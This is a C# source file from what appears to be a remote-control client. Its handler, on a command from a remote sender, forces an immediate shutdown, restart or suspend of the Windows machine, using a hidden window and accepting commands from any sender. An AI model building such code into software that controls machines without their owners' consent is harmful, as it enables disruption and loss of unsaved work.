

using System;
using System.Diagnostics;
using System.Windows.Forms;
using InvokedCommon.Enums;
using InvokedCommon.Messages;
using InvokedCommon.Networking;


namespace InvokedClient.MessageHandlers
{
	public class ShutdownHandler : IMessageProcessor
	{
		public bool CanExecute(IMessage message) => message is DoShutdownAction;

		public bool CanExecuteFrom(ISender sender) => true;

		public void Execute(ISender sender, IMessage message)
		{
			if (!(message is DoShutdownAction message1))
				return;
			this.Execute(sender, message1);
		}

		private void Execute(ISender client, DoShutdownAction message)
		{
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo();
				switch (message.Action)
				{
					case ShutdownAction.Shutdown:
						startInfo.WindowStyle = ProcessWindowStyle.Hidden;
						startInfo.UseShellExecute = true;
						startInfo.Arguments = "/s /t 0";
						startInfo.FileName = "shutdown";
						Process.Start(startInfo);
						break;
					case ShutdownAction.Restart:
						startInfo.WindowStyle = ProcessWindowStyle.Hidden;
						startInfo.UseShellExecute = true;
						startInfo.Arguments = "/r /t 0";
						startInfo.FileName = "shutdown";
						Process.Start(startInfo);
						break;
					case ShutdownAction.Standby:
						Application.SetSuspendState(PowerState.Suspend, true, true);
						break;
				}
			}
			catch (Exception ex)
			{
				client.Send<SetStatus>(new SetStatus()
				{
					Message = "Action failed: " + ex.Message
				});
			}
		}
	}
}